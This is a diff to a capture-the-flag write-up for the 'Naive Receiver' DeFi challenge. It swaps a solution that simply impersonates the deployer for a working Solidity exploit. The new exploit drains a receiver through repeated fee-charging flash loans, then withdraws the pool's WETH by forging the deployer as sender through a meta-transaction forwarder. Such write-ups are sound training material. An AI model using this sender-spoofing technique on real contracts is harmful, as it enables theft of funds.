@@ -26,40 +26,59 @@ The attack can be executed in a **single multicall transaction**, meeting the ch
 
 ### Exploit Code
 ```solidity
-// In NaiveReceiver.t.sol - test_naiveReceiver() function
-function test_naiveReceiver_simple() public checkSolvedByPlayer {
-    vm.stopPrank();  // Clear any existing prank first
-    
-    bytes[] memory calls = new bytes[](11); // 10 flash loans + 1 withdraw
-    
-    // Step 1: 10 flash loans to drain receiver
-    // - Receiver: 10 WETH → 0 WETH (pays 1 WETH fee per loan)
-    // - Pool: 1000 WETH → 1010 WETH (receives the fees)
+function test_naiveReceiver() public checkSolvedByPlayer {
+
+    // Prepare call data for 10 flash loans and 1 withdrawal
+    bytes[] memory callDatas = new bytes[](11);
+
+    // Encode flash loan calls - on behalf of the Naive receiver
     for (uint i = 0; i < 10; i++) {
-        calls[i] = abi.encodeCall(
-            pool.flashLoan,
-            (receiver, address(weth), 0, "")
+        callDatas[i] = abi.encodeCall(
+        NaiveReceiverPool.flashLoan,
+        (receiver, address(weth), 0, "0x")
         );
     }
-    
-    // Step 2: Withdraw all WETH from pool to recovery
-    // - Pool: 1010 WETH → 0 WETH  
-    // - Recovery: 0 WETH → 1010 WETH
-    calls[10] = abi.encodeCall(
-        pool.withdraw,
-        (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))  // 1010 WETH total
+
+    // Encode withdrawal call
+    // Exploit the access control vulnerability by passing the request through the forwarder
+    // And setting the deployer as sender in the last 20 bytes (That's how the pool parses it)
+    callDatas[10] = abi.encodePacked(
+        abi.encodeCall(
+        NaiveReceiverPool.withdraw,
+        (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+        ),
+        bytes32(uint256(uint160(deployer)))
     );
-    
-    // Execute as deployer (has deposits to cover withdrawal)
-    // This counts as 1 transaction for player's nonce
-    vm.startPrank(deployer);
-    pool.multicall(calls); // Executes all 11 function calls atomically
-    vm.stopPrank();
-    
-    // Final state:
-    // ✅ Receiver balance = 0
-    // ✅ Pool balance = 0  
-    // ✅ Recovery balance = 1010 WETH
+
+    // Encode the multicall
+    bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
+
+    // Create forwarder request
+    BasicForwarder.Request memory request = BasicForwarder.Request(
+        player,
+        address(pool),
+        0,
+        gasleft(),
+        forwarder.nonces(player),
+        multicallData,
+        1 days
+    );
+
+    // Hash the request
+    bytes32 requestHash = keccak256(
+        abi.encodePacked(
+        "\x19\x01",
+        forwarder.domainSeparator(),
+        forwarder.getDataHash(request)
+        )
+    );
+
+    // Sign the request
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+    bytes memory signature = abi.encodePacked(r, s, v);
+
+    // Execute the request
+    forwarder.execute(request, signature);
 }
 ```
 
